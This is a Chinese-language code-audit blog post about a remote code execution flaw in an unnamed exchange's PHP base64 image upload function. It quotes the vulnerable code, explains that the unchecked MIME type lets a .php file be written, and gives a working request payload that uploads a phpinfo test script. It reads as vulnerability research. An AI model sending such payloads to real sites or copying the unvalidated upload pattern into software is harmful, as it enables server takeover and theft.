---
title: "某交易所RCE"
date: 2020-10-25T17:28:10+08:00
draft: false
tags: ['交易所']
categories: ['代码审计']
---

# 某交易所RCE

## 漏洞文件
Application/Home/Controller/UserController.class.php
<!--more-->



## 漏洞代码

```perl
 public function base64_image_content($base64_image_content, $path)
    {
        //匹配出图片的格式
        if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $base64_image_content, $result)) {
            $type     = $result[2];
            $new_file = $path."/".date('Ymd', time())."/";
            if (!file_exists($new_file)) {
                //检查是否有该文件夹，如果没有就创建，并给予最高权限
                mkdir($new_file, 0700);
            }
            $new_file = $new_file.time().".{$type}";
            if (file_put_contents($new_file, base64_decode(str_replace($result[1], '', $base64_image_content)))) {
                //return '/'.$new_file;
                return time().'.'.$type.'';
            } else {
                return false;
            }
        } else {
            return false;
        }
    }
```


## 漏洞分析


传参 base64_image_content 和path变量，对传入的base64_image_content进行正则匹配，也就是让我们传一个base64形式的图片，和路径
如data:image/png;base64,xxx，把$result[2]的值赋给变量type。也就是/png这个的内容。生成一个以年月日命名的文件夹。生成一个时间戳的变量赋给new_file。然后对base64后的进行解码，写入文件。代码没判断传入的type头，所以可传入一个php文件




## 漏洞利用


Payload:

```perl
Pc/User/base64_image_content/?base64_image_content=data:image/php;base64,PD9waHAgcGhwaW5mbygpOw==&path=./
```


实战中发现不回显文件夹及文件名，可利用Burp发送Payload，查看返回包的时间戳，然后进行转换即可



